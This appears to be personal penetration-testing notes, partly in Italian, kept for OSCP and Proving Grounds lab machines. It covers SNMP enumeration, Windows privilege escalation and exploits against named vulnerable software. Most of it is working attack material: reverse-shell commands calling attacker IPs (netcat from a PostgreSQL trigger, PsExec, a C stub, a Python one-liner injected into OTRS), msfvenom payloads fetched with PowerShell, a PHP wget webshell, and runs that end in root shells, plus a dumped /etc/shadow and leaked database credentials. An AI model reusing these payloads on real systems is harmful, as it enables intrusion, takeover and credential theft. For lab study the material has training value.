(base) ┌──(kali㉿kali)-[~/Programs/Finger-User-Enumeration]
└─$ snmp-check 192.168.199.42 -c public
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.199.42:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.199.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:47:18.09
  Uptime system                 : 00:46:46.62
  System date                   : 2021-6-7 10:04:16.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 152628
  TCP segments sent             : 149146
  TCP segments retrans          : 746
  Input datagrams               : 154288
  Delivered datagrams           : 154288
  Output datagrams              : 150582

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] eth0
  Id                            : 2
  Mac Address                   : 00:50:56:bf:d0:b7
  Type                          : ethernet-csmacd
  Speed                         : 100 Mbps
  MTU                           : 1500
  In octets                     : 17672196
  Out octets                    : 41539953

  Interface                     : [ down ] sit0
  Id                            : 3
  Mac Address                   : 00:00:00:00:d0:b7
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 1480
  In octets                     : 0
  Out octets                    : 0


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  1                     127.0.0.1             255.0.0.0             0                   
  2                     192.168.199.42        255.255.255.0         1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               192.168.199.254       0.0.0.0               1                   
  192.168.199.0         0.0.0.0               255.255.255.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               25                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               139                   0.0.0.0               0                     listen              
  0.0.0.0               199                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               31337                 0.0.0.0               0                     listen              
  192.168.199.42        25                    192.168.49.199        34668                 established         

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               137                 
  0.0.0.0               138                 
  0.0.0.0               161                 
  192.168.199.42        137                 
  192.168.199.42        138                 

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              init                  init [2]                                  
  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
  3                     runnable              events/0              events/0                                  
  4                     runnable              khelper               khelper                                   
  5                     runnable              kacpid                kacpid                                    
  99                    runnable              kblockd/0             kblockd/0                                 
  109                   runnable              pdflush               pdflush                                   
  110                   runnable              pdflush               pdflush                                   
  111                   runnable              kswapd0               kswapd0                                   
  112                   runnable              aio/0                 aio/0                                     
  255                   runnable              kseriod               kseriod                                   
  276                   runnable              scsi_eh_0             scsi_eh_0                                 
  284                   runnable              khubd                 khubd                                     
  348                   runnable              shpchpd_event         shpchpd_event                             
  380                   runnable              kjournald             kjournald                                 
  935                   runnable              vmmemctl              vmmemctl                                  
  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                        
  3773                  running               syslogd               /sbin/syslogd                             
  3776                  runnable              klogd                 /sbin/klogd                               
  3780                  runnable              clamd                 /usr/local/sbin/clamd                      
  3782                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3795                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
  3797                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3801                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3802                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3808                  runnable              sshd                  /usr/sbin/sshd                            
  3886                  runnable              sendmail-mta          sendmail: MTA: accepting connections                      
  3900                  runnable              atd                   /usr/sbin/atd                             
  3903                  runnable              cron                  /usr/sbin/cron                            
  3910                  runnable              apache                /usr/sbin/apache                          
  3911                  runnable              apache                /usr/sbin/apache                          
  3912                  runnable              apache                /usr/sbin/apache                          
  3913                  runnable              apache                /usr/sbin/apache                          
  3914                  runnable              apache                /usr/sbin/apache                          
  3915                  runnable              apache                /usr/sbin/apache                          
  3931                  runnable              getty                 /sbin/getty           38400 tty1          
  3937                  runnable              getty                 /sbin/getty           38400 tty2          
  3938                  runnable              getty                 /sbin/getty           38400 tty3          
  3939                  runnable              getty                 /sbin/getty           38400 tty4          
  3940                  runnable              getty                 /sbin/getty           38400 tty5          
  3941                  runnable              getty                 /sbin/getty           38400 tty6          
  4045                  runnable              apache                /usr/sbin/apache                          
  4053                  runnable              apache                /usr/sbin/apache                          
  4098                  runnable              apache                /usr/sbin/apache                          
  4120                  runnable              apache                /usr/sbin/apache                          
  4123                  runnable              apache                /usr/sbin/apache                          
  4907                  runnable              inetd                 /usr/sbin/inetd                           

[*] Storage information:

  Description                   : ["Real Memory"]
  Device id                     : [#<SNMP::Integer:0x000055adb62752e0 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61d75b8 @value=1024>]
  Memory size                   : 250.82 MB
  Memory used                   : 144.49 MB

  Description                   : ["Swap Space"]
  Device id                     : [#<SNMP::Integer:0x000055adb61d1ed8 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61cbfb0 @value=1024>]
  Memory size                   : 203.91 MB
  Memory used                   : 0 bytes

  Description                   : ["/"]
  Device id                     : [#<SNMP::Integer:0x000055adb6272b58 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb6270e70 @value=4096>]
  Memory size                   : 3.74 GB
  Memory used                   : 779.46 MB

  Description                   : ["/sys"]
  Device id                     : [#<SNMP::Integer:0x000055adb61bf968 @value=5>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61bdc08 @value=4096>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes


[*] File system information:

  Index                         : 1
  Mount point                   : /
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 1

[*] Device information:

  Id                    Type                  Status                Descr               
  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7371 16-Core Processor
  1025                  unknown               running               network interface lo
  1026                  unknown               running               network interface eth0
  1027                  unknown               down                  network interface sit0
  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
  1552                  unknown               unknown               SCSI disk (/dev/sda)
  3072                  unknown               unknown               Guessing that there's a floating point co-processor
```


RCE:
https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/


### accesschk (Windows)
Lo trovi in **~/Download** da caricare sulla macchina

C:\Backup>accesschk.exe /accepteula -q -a TFTP.EXE_bck
accesschk.exe /accepteula -q -a TFTP.EXE_bck
C:\Backup\TFTP.EXE_bck
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW BUILTIN\Administrators
  RW NT AUTHORITY\SYSTEM
  RW NT AUTHORITY\Authenticated Users


### cacls (Windows)
Già su Windows

C:\Backup>cacls TFTP.EXE_bck
cacls TFTP.EXE_bck
C:\Backup\TFTP.EXE_bck BUILTIN\Users:(ID)F 
                       BUILTIN\Administrators:(ID)F 
                       NT AUTHORITY\SYSTEM:(ID)F 
                       NT AUTHORITY\Authenticated Users:(ID)C 


### schtasks (Windows Task Scheduler)

https://docs.microsoft.com/it-it/windows-server/administration/windows-commands/schtasks

Creare un task schedulato che esegue ogni minuto: ("tftp" è il nome che si sceglie per il task e "\Backup\TFTP.EXE" è il path dell'eseguibile e si deve mettere in quel modo)
```
schtasks /create /sc minute /mo 1 /tn "tftp" /tr \Backup\TFTP.EXE
```

Cercare un task schedulato per nome:
```
C:\Backup>schtasks /query /tn tftp2
schtasks /query /tn tftp2

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
tftp2                                    6/8/2021 11:09:00 AM   Ready     
```

Eliminare un task schedulato per nome:
```
schtasks /end /tn tftp2
```



### Postgres

UDF
https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1
https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md

Command Execution without UDF
https://dba.stackexchange.com/questions/128229/execute-system-commands-in-postgresql

(Prima metti in listening)

```
CREATE TABLE trigger_test (
    tt_id serial PRIMARY KEY,
    command_output text
);

CREATE OR REPLACE FUNCTION trigger_test_execute_command()
RETURNS TRIGGER
LANGUAGE plpgsql
AS $BODY$
BEGIN
    COPY trigger_test (command_output) FROM PROGRAM '/bin/nc 192.168.49.102 80 -e /bin/bash';
    RETURN NULL;
END;
$BODY$;

DROP TABLE trigger_test_source;

CREATE TABLE trigger_test_source (
    s_id integer PRIMARY KEY
);

CREATE TRIGGER tr_trigger_test_execute_command
    AFTER INSERT
    ON trigger_test_source
    FOR EACH STATEMENT
    EXECUTE PROCEDURE trigger_test_execute_command();

INSERT INTO trigger_test_source VALUES (2);
```

Altri comandi:
https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md

List Databases:
```
\l
```

List Database Users:
```
\du
```

Read directory:
```
select pg_ls_dir('/etc');
```

Read file:
```
select pg_read_file('postgresql.conf', 0, 200);
```


### Git ssh
```
git clone /git-server
```

Log:
```
git log
```

Set Git identity:
```
[dademola@hunit git-server]$ git config --global user.name "dademola"
[dademola@hunit git-server]$ git config --global user.email "dademola@hunit.(none)"
```

```
[dademola@hunit git-server]$ git add backups.sh 
[dademola@hunit git-server]$ git commit -m "Wait for sheeeeell ;)
```

```
[dademola@hunit git-server]$ export GIT_SSH_COMMAND='ssh -p 43022 -i /home/git/.ssh/id_rsa'
[dademola@hunit git-server]$ git push git@192.168.85.125:/git-server
```

### PsExec
Eseguire un comando con un utente (magari con privilegi più alti) dalla macchina di un altro utente:
```
C:\Users\Bethany\Desktop>PsExec.exe -accepteula -u alice -p aliceishere "%CD%\nc.exe" 192.168.119.168 7676 -e cmd.exe
```

### PHP Info File
Determinare il path della directory della web root:

```
kali@kali:~$ curl http://192.168.120.132:45332/phpinfo.php | grep 'DOCUMENT_ROOT' | html2text
...
DOCUMENT_ROOT
C:/xampp/htdocs
...
```




## Software Vulnerable

### JAMES SMTP Server 2.3.2 (Beta machine Lab)
root:root

jamesSmtpServer.py
https://www.exploit-db.com/exploits/35513


### OpenSMTPD (port 25)

https://www.exploit-db.com/exploits/48051

```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Bratarina]
└─$  ./raptor_opensmtpd.pl RCE 192.168.231.71 192.168.49.231
raptor_opensmtpd.pl - LPE and RCE in OpenBSD's OpenSMTPD
Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>

< 220 bratarina ESMTP OpenSMTPD
> HELO fnord
< 250 bratarina Hello fnord [192.168.49.231], pleased to meet you
> MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>
< 250 2.0.0 Ok
> RCPT TO:<root>
< 250 2.1.5 Destination address valid: Recipient ok
> DATA
< 354 Enter mail, end with "." on a line by itself
< 250 2.0.0 f8bf4a34 Message accepted for delivery

Payload sent, please wait 5 seconds...
80: inverse host lookup failed: Unknown host
listening on [any] 34103 ...



(base) ┌──(kali㉿kali)-[~/Programs/JuicyPotato]
└─$ sudo nc -lnvp 80
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.49.231] from (UNKNOWN) [192.168.231.71] 57454
/bin/sh: 0: can't access tty; job control turned off
# id 
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cd /root
# ls
proof.txt
# cat proof.txt
26bcea75ccba60f179ce42707a2f04a8
```

Oppure

searchsploit -x linux/remote/47984.py

To leverage this, we’ll need to first create a reverse shell payload and host it on our Kali machine.
```
kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.135 LPORT=445
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next we’ll copy the exploit to a working directory.
```
kali@kali:~$ searchsploit -m 47984
  Exploit: OpenSMTPD 6.6.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/47984.py
```

Let’s run the exploit to download our payload to the target.
```
kali@kali:~$ python3 47984.py 192.168.135.71 25 'wget 192.168.49.135/shell -O /tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
kali@kali:~$ python3 47984.py 192.168.135.71 25 'chmod +x /tmp/shell'

[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

Finally, we’ll start a netcat listener and run the exploit one last time to obtain a reverse shell.

```
kali@kali:~$ python3 47984.py 192.168.135.71 25 '/tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

And we obtain the reverse shell:
```
kali@kali:~$ sudo nc -lvp 445
listening on [any] 445 ...
192.168.135.71: inverse host lookup failed: Unknown host
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.71] 54626
ifconfig -a && hostname && whoami
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.135.71  netmask 255.255.255.0  broadcast 192.168.135.255
        ether 00:50:56:bf:c7:95  txqueuelen 1000  (Ethernet)
        RX packets 2689  bytes 180034 (180.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1111  bytes 301967 (301.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2998  bytes 653581 (653.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2998  bytes 653581 (653.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bratarina
root
```



### Barracuda 6.5 
**Local Privilege Escalation**
https://packetstormsecurity.com/files/158812/BarracudaDrive-6.5-Local-Privilege-Escalation.html

Nello file .c possiamo inserire:
```
#include <windows.h>
#include <winbase.h>

int main(void){
     system("C:\\Sites\\userpro\\nc.exe 192.168.49.237 139 -e cmd.exe");
     WinExec("C:\\bd\\bd.service.exe", 0);
    return 0;
}
```

Così da avere una reverse shell, invece di aggiungere un nuovo utente amministratore (come viene fatto nella PoC dell'url sopra) perchè potremmo non avere una porta rdp o potrebbe non funzionare psexec e quindi non riuscire a loggarsi con il nuovo utente.


### Unreal Tournament 

Unreal Tournament - Remote Buffer Overflow (SEH)
/usr/share/exploitdb/exploits/windows/remote/16145.pl

```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/UT99]
└─$ perl 16145.pl 192.168.128.44 7778 192.168.49.128 80


(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/UT99]
└─$ sudo nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.128.44] 49224
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\UnrealTournament\System>
```


### FoxitReader (Windows program)

```
sc qc FoxitCloudUpdateService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FoxitCloudUpdateService
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Foxit Cloud Safe Update Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

START_TYPE -> AUTO_START

se il nostro utente ha i privilegi di riavviare il sistema si può usare **Unquoted Service Path**

```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/UT99]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.102 LPORT=3306 -f exe > Foxit.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes

```

```
C:\UnrealTournament\System>powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.102:3306/Foxit.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.102:3306/Foxit.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')"


C:\UnrealTournament\System>dir "C:\Program Files (x86)\Foxit Software\"
dir "C:\Program Files (x86)\Foxit Software\"
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Program Files (x86)\Foxit Software

06/12/2021  05:39 AM    <DIR>          .
06/12/2021  05:39 AM    <DIR>          ..
10/07/2015  04:05 AM    <DIR>          Foxit Reader
06/12/2021  05:39 AM             7,168 Foxit.exe
               1 File(s)          7,168 bytes
               3 Dir(s)  13,052,895,232 bytes free

C:\UnrealTournament\System>shutdown /r
shutdown /r


(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/UT99]
└─$ sudo nc -lnvp 3306
listening on [any] 3306 ...
connect to [192.168.49.102] from (UNKNOWN) [192.168.102.44] 49158
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```


Altro modo per controllare le info dei servizi che hanno come startmode "Auto":
```
wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """
Foxit Cloud Safe Update Service                         FoxitCloudUpdateService         C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe          Auto       
```


### IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) - Missing DLL (Windows)

First we will check if the IKEEXT service exists, is enabled, and running:
```
C:\UnrealTournament\System>sc query IKEEXT
sc query IKEEXT

SERVICE_NAME: IKEEXT
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\UnrealTournament\System>
```

Next, we need to check if the wlbsctrl.dll file exists in the system (and does not exist):
```
C:\UnrealTournament\System>dir wlbsctrl.dll /s
dir wlbsctrl.dll /s
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB
File Not Found
```

Next, we will check the PATH variable:
```
C:\UnrealTournament\System>PATH
PATH
PATH=C:\Python\Scripts\;C:\Python\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
```

The directories *C:\Python\Scripts* and *C:\Python* are interesting, and we will check their permissions:
```
C:\UnrealTournament\System>icacls C:\Python\Scripts\
icacls C:\Python\Scripts\
C:\Python\Scripts\ BUILTIN\Administrators:(I)(F)
                   BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                   NT AUTHORITY\SYSTEM:(I)(F)
                   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                   BUILTIN\Users:(I)(OI)(CI)(RX)
                   NT AUTHORITY\Authenticated Users:(I)(M)
                   NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\UnrealTournament\System>icacls C:\Python\
icacls C:\Python\
C:\Python\ BUILTIN\Administrators:(I)(F)
           BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
           BUILTIN\Users:(I)(OI)(CI)(RX)
           NT AUTHORITY\Authenticated Users:(I)(M)
           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
```

Both folders have the Modify permission granted for NT AUTHORITY\Authenticated Users so we can use either of them to write our custom wlbsctrl.dll file:
```
root@kali:~/Documents/VulnHub/UT99# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.118.3 LPORT=4445 -f dll > wlbsctrl.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 5120 bytes
```

Upload the payload:
```
C:\UnrealTournament\System>dir /B C:\Python\wlbsctrl.dll
dir /B C:\Python\wlbsctrl.dll
File Not Found

C:\UnrealTournament\System>powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3/wlbsctrl.dll', 'C:\Python \wlbsctrl.dll')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3/wlbsctrl.dll', 'C:\Python \wlbsctrl.dll')"


C:\UnrealTournament\System>dir /B C:\Python\wlbsctrl.dll
dir /B C:\Python\wlbsctrl.dll
wlbsctrl.dll
```

Finally, we will set up a netcat listener and then power cycle the machine to catch the privileged reverse shell.
```
C:\UnrealTournament\System>shutdown -r -t 10 && exit
shutdown -r -t 10 && exit
root@kali:~#


root@kali:~# nc -lvp 4445
listening on [any] 4445 ...
192.168.120.84: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.84] 49158
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```



### Platronics Hub app (version 3.13.2)

 https://www.exploit-db.com/exploits/47845


- Open cmd.exe 
- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
- echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.config
            
Per l'ultimo step, copio un config file a caso e lo rinomino dopo aver inserito:
jane|advertise|C:\Windows\System32\cmd.exe

perchè se creavo un file di testo, non lo vedeva come config e quindi non funzionava (Windows stronzo!)

Ed esegue cmd come amministratore.


### phpLiteAdmin v1.9.3
https://v3ded.github.io/ctf/zico2
Praticamente si crea un nuovo database chiamato "hack.php" (il nome è indifferente, basta che ci sia l'estensione .php) e si inserisce poi una tabella con un solo field con il valore di default con codice php.
Per esempio:
```
`<?php system("wget 192.168.119.168:8000/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>`
```

Ovviamente il file deve essere accessibile per poter essere chiamato.
Ad esempio nella macchina del lab Dotty, c'era una web app con Cuppa CMS che era vulnerabile a LFI e quindi si poteva usare per accedere al file che si caricava.

### Cuppa CMS
https://www.exploit-db.com/exploits/25971

Riprendendo l'esempio che ho fatto nella sezione phpLiteAdmin v1.9.3, il file caricato, veniva richiamato così:
http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../usr/local/databases/hack.php


### Webmin / Usermin Arbitrary File Disclosure Vulnerability
/usr/share/exploitdb/exploits/multiple/remote/1997.php

```
    ┌──(kali㉿kali)-[~/Documents/OSCP/Fc4]
    └─$ php 1997.php 10.11.1.141 10000 http /etc/shadow
    Attacking 10.11.1.141
    ---------------------------------
    root:$1$236Vlq03$B7t0m/g9MRJmiR/ufF4jo0:16903:0:99999:7:::
    bin:*:13653:0:99999:7:::
    daemon:*:13653:0:99999:7:::
    adm:*:13653:0:99999:7:::
    lp:*:13653:0:99999:7:::
    sync:*:13653:0:99999:7:::
    shutdown:*:13653:0:99999:7:::
    halt:*:13653:0:99999:7:::
    mail:*:13653:0:99999:7:::
    news:*:13653:0:99999:7:::
    uucp:*:13653:0:99999:7:::
    operator:*:13653:0:99999:7:::
    games:*:13653:0:99999:7:::
    gopher:*:13653:0:99999:7:::
    ftp:*:13653:0:99999:7:::
    nobody:*:13653:0:99999:7:::
    dbus:!!:13653:0:99999:7:::
    vcsa:!!:13653:0:99999:7:::
    rpm:!!:13653:0:99999:7:::
    haldaemon:!!:13653:0:99999:7:::

    [...]
```


### Timeclock software
By searching online the timeclock software, we find a **script to run a sql injection to find the admin password**:
https://github.com/timip/exploit/blob/master/timeclock.py

We (maybe) run more than one time to retreive the password:
```
    ┌──(kali㉿kali)-[~/Documents/OSCP/Fw_dev]
    └─$ python timeclock.py 10.11.1.252 8000
    Running!
    GY5sziW2uP9LHyv
    Done! Try Harder!
```


### CoreHTTP Server Version 0.5.3.1 and Below
https://github.com/tobor88/Bash/blob/master/corehttp-rev-shell.sh


### WordPress exploit plugin:
https://dl.packetstormsecurity.net/papers/attack/exploiting-uploads.pdf


### elastix-2.2
https://www.exploit-db.com/exploits/18650

Se lo script dà questi errori:
```
IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)
IOError: [Errno socket error] [SSL: DH_KEY_TOO_SMALL] dh key too small (_ssl.c:727)
```
Aggiungere nello script:
```
> ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
> ctx.set_ciphers('HIGH:!DH:!aNULL') 
> urllib.urlopen(url, context=ctx)
```

E poi eseguire dopo aver messo un listener:
```
python2.7 18650.py  
```

### RealVNC 4.1.0/4.1.1 

https://www.exploit-db.com/exploits/36932
```
    ┌──(kali㉿kali)-[~/Documents/OSCP/Jd]
    └─$ python 36932.py 10.11.1.227 5900
    [*] Hello From Server: RFB 003.008
    
    [*] The remote VNC service is vulnerable
    [*] Listener Socket Bind Complete
    [*] Launching local vncviewer
    [*] Listener waiting for VNC connections on localhost
    Connected to RFB server, using protocol version 3.8
    [*] Auth Methods Recieved. Sending Null Authentication Option to Client
    No authentication needed
    [*] Proxying data between the connections...
    Authentication successful
    Desktop name "JD"
    VNC server default format:
      32 bits per pixel.
      Least significant byte first in each pixel.
      True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
    Using default colormap which is TrueColor.  Pixel format:
      32 bits per pixel.
      Least significant byte first in each pixel.
      True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
    Same machine: preferring raw encoding
```
This open a windows with tightVNC

### ApPHP MicroBlog 1.0.1
Remote Command Execution 
https://www.exploit-db.com/exploits/33070

```
┌──(kali㉿kali)-[~/Documents/OSCP/Jeff]
    └─$ python 33070.py http://10.11.1.223/index.php                                   1 ⨯
      -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
    original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
    [*] Testing for vulnerability...
    [+] Website is vulnerable
    
    [*] Fecthing phpinfo
    	PHP Version 5.6.40
    	System   Windows NT JEFF 6.2 build 9200 (Windows Server 2012 Standard Edition) AMD64
    	Loaded Configuration File   C:\xampp\php\php.ini
    	Apache Version   Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40
    	Server Root   C:/xampp/apache
    	SystemRoot   C:\Windows
    	DOCUMENT_ROOT   C:/xampp/htdocs
    	PHP Version   5.6.40
    	allow_url_fopen  On  On
    	allow_url_include  Off  Off
    	disable_functions   no value    no value
    	open_basedir   no value    no value
    	SystemDrive   C:
    	SystemRoot   C:\Windows
    	System V Message based IPC   Wez Furlong
    	System V Semaphores   Tom May
    	System V Shared Memory   Christian Cartus
    
    [*] Fetching include/base.inc.php
    <?php
        
        define('DATABASE_HOST', 'localhost');           // Database host
        define('DATABASE_NAME', 'blog');           // Name of the database to be used
        define('DATABASE_USERNAME', 'root');       // User name for access to database
        define('DATABASE_PASSWORD', 'dsfdfkj435dgf');   // Password for access to database
        
        define('DB_PREFIX', 'mb_');		        // Unique prefix of all tables in the database
    
        define("PASSWORDS_ENCRYPTION_TYPE",  "AES");  // AES|MD5
        define("PASSWORDS_ENCRYPTION",  true);              // true|false
        define("PASSWORDS_ENCRYPT_KEY", "apphp_microblog");
        
    ?>
    
    [*] Testing remote execution
    [+] Remote exec is working with system() :)
    Submit your commands, type exit to quit
    >
```
E si può creare una reverse shell



### OTRS 5.0.x/6.0.x
Remote Command Execution
https://www.exploit-db.com/exploits/43853
Come dice lo script:
We navigate the url:
http://10.11.1.39/otrs/index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework;#PGP::Options

and in the option, we insert:
 PGP 			yes
 PGP::Bin 		/bin/python
 PGP::Options 	-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.168",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


We start a listener
nc -lnvp 443

and we navigate the page:
10.11.1.39/otrs/index.pl?Action=AdminPGP


### ColdFusion 8
https://nets.ec/Coldfusion_hacking
https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/

We find online that the version is vulnerable to LFI. Indeed by using this:
**?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en** all'url: 
